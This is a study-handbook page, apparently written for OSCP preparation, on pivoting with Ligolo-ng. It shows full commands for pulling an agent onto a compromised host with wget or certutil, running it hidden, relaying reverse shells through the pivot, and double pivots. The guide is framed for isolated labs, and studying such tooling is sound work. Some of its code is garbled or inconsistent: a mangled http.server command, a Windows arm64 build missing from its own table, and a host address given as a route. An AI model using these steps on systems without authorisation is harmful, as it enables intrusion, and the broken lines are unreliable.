---
title: "Ligolo-ng"
slug: ligolo-ng
category: notes
handbook: oscp
tags: ["pivoting"]
draft: false
pubDatetime: 2026-08-01T10:35:17+03:00
modDatetime: 2026-09-13T20:51:50+03:00
description: "Ligolo-ng creates a TUN-based path through a compromised host."
---
Ligolo-ng creates a TUN-based path through a compromised host. The proxy runs on Kali and the unprivileged agent runs on the pivot. The decision workflow is in [Tunneling and Pivoting](/collections/oscp/tunneling-and-pivoting).

## Install

Install the Kali proxy and the cross-platform agent binaries:

```bash
sudo apt update
sudo apt install -y ligolo-ng ligolo-ng-common-binaries
```

The Kali commands are:

```text
ligolo-proxy
ligolo-agent
```

Transfer the matching agent from `/usr/share/ligolo-ng-common-binaries/` to the pivot. The filenames contain the version, the operating system and the CPU architecture:

```bash
ls /usr/share/ligolo-ng-common-binaries/
```

Choose the build from what the pivot reports, not from what Kali is:

```bash
uname -m                            # Linux pivot
```

```powershell
echo $env:PROCESSOR_ARCHITECTURE    # Windows pivot, PowerShell only
```

```cmd
echo %PROCESSOR_ARCHITECTURE%       # Windows pivot, cmd
```

| Pivot reports    | Tokens in the filename |
| ---------------- | ---------------------- |
| `x86_64`         | `linux` `amd64`        |
| `i686` or `i386` | `linux` `386`          |
| `aarch64`        | `linux` `arm64`        |
| `AMD64`          | `windows` `amd64`      |
| `x86`            | `windows` `386`        |

A 32-bit shell on 64-bit Windows also reports `x86`, and the 32-bit agent runs there through WoW64, so the `windows 386` build is the safe choice when the architecture is unclear.

## Start the Proxy

Start the proxy with a self-signed certificate:

```bash
sudo ligolo-proxy -selfcert
```

The agent connection listens on TCP `11601` by default.

## Proxy Won't Start

When the WebUI is enabled (the proxy asks about it on first run and stores the answer in its config), ligolo also opens a web/API listener on `127.0.0.1:8080`, and the proxy dies with `FATA ... listen tcp 127.0.0.1:8080: bind: address already in use` when that port is taken. Burp's default proxy listener sits on exactly this port, which makes Burp the usual culprit. Identify the holder, then close it or move the API:

```bash
ss -tlnp | grep 8080                # who holds the port
ligolo-proxy -h | grep -i api       # the api-port style flag, in versions that have one
```

`write UDPv4 []: Network is unreachable` lines at startup are noise, not the failure: something tried a UDP write the kernel had no route for at that moment. The proxy starts fine as long as no `FATA` line follows.

## Start the Agent

The agent binary has to be on the pivot first. Serve the build chosen above from Kali and pull it down before running it. Other transfer channels are in [File Transfers](/collections/oscp/file-transfers).

Kali, stage and serve the binary:

```bash
cp /usr/share/ligolo-ng-common-binaries/<agent_build> ~/OSCP/tools/ligolo-agent
cd ~/OSCP/tools && python3 -m http.server&& python3 -m http.server sudo python3 -m http.server 8000
```

Linux pivot, download into a writable directory such as `/tmp` and run backgrounded to keep the shell:

```bash
cd /tmp
wget http://172.16.37.128:8000/ligolo-ng_agent_0.9_linux_amd64 -O ligolo-agent
chmod +x ligolo-agent
./ligolo-agent -connect 172.16.37.128:11601 -ignore-cert &
```

Windows pivot:

```cmd
certutil -urlcache -split -f http://KALI/ligolo-ng_agent_0.9_windows_arm64.exe ligolo-agent.exe
start /b .\ligolo-agent.exe -connect KALI:11601 -ignore-cert
```

`KALI` is the Kali address reachable from the pivot, not a NAT or loopback address. Port `8000` is the HTTP server the binary is pulled from; port `11601` is the proxy the agent connects back to. `-ignore-cert` accepts whatever certificate the self-signed proxy presents, which is all an isolated lab or the exam network needs.

A connected agent prints `Connection established` and keeps running. That is success, not a hang: the agent process holds the tunnel open for its whole life, so it never returns to a prompt. Everything after this happens in the proxy console on Kali, not on the pivot.

### Keeping the shell

The running agent owns the terminal it was launched from: its log lines keep printing and it accepts no input. This is expected, and it is the classic way to lose a pivot's only shell. Launch it backgrounded from the start, or accept that the shell is gone and get another one.

Linux pivot, backgrounded and detached so it outlives the shell that started it:

```bash
setsid ./ligolo-agent -connect KALI:11601 -ignore-cert >/tmp/.l 2>&1 &
```

Windows cmd, `start /b` returns the prompt immediately:

```cmd
start /b .\ligolo-agent.exe -connect KALI:11601 -ignore-cert
```

`start /b` shares the launcher's console, so an agent started that way still dies when the shell's connection dies. The detached form gives the agent its own hidden console:

```powershell
Start-Process -WindowStyle Hidden -FilePath .\ligolo-agent.exe -ArgumentList '-connect','KALI:11601','-ignore-cert'
```

A single reverse shell sacrificed to a foreground agent is not a disaster: re-exploit for a fresh shell (on Medtech, rerun the SQLi payload and PrintSpoofer) and run the agent properly the second time. Prefer a second independent shell for the pivot, or SSH once credentials are in hand, so one channel stays free for work while the agent runs on its own. A single reverse shell carrying both the tunnel and the interactive session is fragile.

## Create a Single Pivot

Everything in this section runs in the proxy console, and nothing works until an agent is connected: `session` answers `error: no sessions available` and `ifconfig` answers `error: please, select an agent` until one is. Those errors mean go back and start the agent, not that something is broken.

With an agent connected, the sequence and what each step depends on:

1. `session` selects which connected pivot the later commands act on. It prints a picker listing the connected agents; pick the right one.
2. `ifconfig` prints the networks the *selected* agent can see. This is where the route value in step 4 comes from: the pivot's internal adapter and its subnet. The same answer is visible on the pivot itself in `ipconfig` or `ip addr`.
3. `interface_create --name pivot1` creates the Kali-side TUN interface the traffic will arrive on.
4. `interface_add_route --name pivot1 --route <internal_subnet>` points that interface at the subnet found in step 2. The subnet is whatever the pivot's internal adapter actually sits on, lab by lab: `172.16.237.0/24` for the Medtech WEB02 pivot, and the `10.10.10.0/24` seen in older examples was that lab's internal net, not a fixed value.
5. `tunnel_start --tun pivot1` wires the selected agent to the interface. From this moment Kali routes the internal subnet through the pivot.

```text
session
? Choose a session : 1
ifconfig
interface_create --name pivot1
interface_add_route --name pivot1 --route 10.10.194.153/24
tunnel_start --tun pivot1
```

Confirm the route from another Kali terminal:

```bash
ip route show dev pivot1
```

Test one known service before scanning:

```bash
nc -vz 10.10.10.20 445
nmap -Pn -n -sT -p445 10.10.10.20
```

## Internal Reverse Connections

Select the pivot agent and create a listener:

```text
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:9001 --tcp
listener_list
```

Start the catcher on Kali:

```bash
nc -lvnp 9001
```

The reverse payload on an internal target connects to:

```text
PIVOT_INTERNAL_IP:4444
```

`PIVOT_INTERNAL_IP` is the pivot's own address on the internal subnet, the interface the target can reach. Read it from `ip addr` on the pivot, or `ifconfig` in the proxy console, and pick the address on the same network as the target. It is not the pivot's Kali-facing address and not Kali's address, because the internal target has no route to either.

Ligolo-ng relays that connection to `127.0.0.1:9001` on Kali, where Netcat is listening.

Stop the listener by its ID:

```text
listener_stop 0
```

## Reach the Pivot's Localhost

Add the Ligolo-ng magic address to the selected agent's interface:

```text
interface_add_route --name pivot1 --route 240.0.0.1/32
```

Traffic sent to `240.0.0.1` reaches `127.0.0.1` on that agent:

```bash
nmap -Pn -n -sT -sV 240.0.0.1
curl http://240.0.0.1:8080/
```
	
## Stop and Inspect

Useful proxy console commands:

```text
session
tunnel_list
listener_list
interface_list
help
```

Stop the selected agent's tunnel:

```text
tunnel_stop
```

Remove the route or interface with the matching `interface_*` commands shown by `help`. Check the installed version's help before cleanup because interface management changed across Ligolo-ng releases.

## Double Pivot

Do not start with a double pivot. After the first tunnel is stable, a listener on the first agent can relay a second agent connection to the proxy:

```text
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601 --tcp
```

The second agent connects to the first pivot:

```bash
./ligolo-agent -connect PIVOT1_INTERNAL_IP:4444 -ignore-cert
```

Select the second agent, give it a separate TUN interface and route, then start its tunnel. Practice this only after single-pivot routing and reverse callbacks are reliable.

## Tunnel Recovery Runbook

The failure signature: every TCP connect to the internal subnet times out at once, tools that worked minutes ago stall, and nothing on the target side prints an error. Medtech burned real time on this exact failure. Walk the checks, then apply the recovery in order. The generic skill is in [Tunneling and Pivoting](/collections/oscp/tunneling-and-pivoting#verify-the-path-before-trusting-it); this is the ligolo-specific version with every error message hit so far.

### Checks, in order

1. `ip addr show pivot1` exists and is UP. Ligolo keeps its own interface table, and entries marked **Pending** only materialize as kernel devices on `tunnel_start`. A console-listed interface with no kernel device is expected *before* the tunnel starts and wrong *after*.
2. `ip route show dev pivot1` shows the subnet **without `linkdown`**. `linkdown` means the kernel refuses to carry the route: the tunnel is not started, or is bound to a dead session.
3. Proxy console, `session`: the agent is listed. A reconnected agent registers as a *new* session, and the tunnel stays bound to the dead one. Selecting is not re-binding; `tunnel_start` must run again.
4. `nc -vz -w 3 TARGET <known-open-port>` prints `succeeded!`. Test a port seen open on that host before, so a timeout is a tunnel verdict and not a target verdict.
5. Scope: every internal host failing means the tunnel; one host failing while neighbours answer means that host changed.
6. Hop isolation without a pivot shell: `interface_add_route --name pivot1 --route 240.0.0.1/32`, then `nc -vz -w 3 240.0.0.1 <open port on the pivot>`. 240.0.0.1 terminates inside the agent itself, so it exercises only the Kali↔agent leg. Works = that leg is healthy and the break is the pivot's internal side. Times out = the agent session is a zombie.

### The recovery that works

The console keeps its own interface and route table, and repeated fix attempts pollute it: duplicate routes, malformed entries, stale tunnel bindings. Once checks 1 to 4 point at tunnel state, stop debugging and rebuild the entry from scratch, which is what finally cleared Medtech:

```text
tunnel_stop
interface_delete --name pivot1
interface_create --name pivot1
interface_add_route --name pivot1 --route <internal subnet>
tunnel_start --tun pivot1
```

`interface_delete` may be named differently per release; `help` lists it. Then re-run checks 1 to 4 before touching any tool. And any scan that overlapped the outage has a completeness question mark: hosts whose probes died mid-run look identical to hosts that do not exist, so re-run the affected sweep once the path is green.

### Error decoder

| Message | Meaning | Fix |
|---|---|---|
| `error: no sessions available` | No agent connected | Start the agent on the pivot |
| `error: please, select an agent` | Console commands need a selected session | `session`, pick one |
| `error: file exists` (route add) | The route is already in the kernel | Harmless, skip |
| `error: already running` (tunnel_start) | A stale tunnel instance is still bound | `tunnel_stop`, then `tunnel_start` |
| `Could not add route ...: invalid CIDR` on every start | A polluted interface entry holds a malformed route | Delete the interface entry, recreate, re-add one correct route |
| `ip route` shows `linkdown` | The kernel refuses the route: no live tunnel on that interface | `tunnel_stop` + `tunnel_start` after selecting the session |
| `write UDPv4 ... Network is unreachable` at startup | A UDP write with no route at that moment | Noise, non-fatal |

### Escalation

- Console state still wedged after the clean sequence: Ctrl+C the proxy and start it fresh (`sudo ligolo-proxy -selfcert`). A live agent reconnects on its own within seconds; select the session and redo the interface sequence.
- No session at all: the agent process is dead. Re-exploit the pivot, kill the corpse (`taskkill /f /im ligolo-agent.exe`), relaunch detached, then rebind in the console.
- The pivot itself cannot reach the internal net: from its shell, `Test-NetConnection TARGET -Port <port>` (wrap in `powershell -c "..."` from cmd). Failing there means the pivot's adapter or the lab's virtual network broke, and no attack-side command fixes that.

## Certificate Pinning

Not needed for OSCP or an isolated lab, where nothing else is on the wire to impersonate the proxy, so the steps above use `-ignore-cert`. On a real engagement, pin the certificate instead so another host cannot answer on `11601` and collect the tunnel with every session behind it. Print the fingerprint in the proxy console and pass it to the agent in place of `-ignore-cert`:

```text
certificate_fingerprint
```

```bash
./ligolo-agent -connect KALI:11601 -accept-fingerprint <SHA256_FINGERPRINT>
```
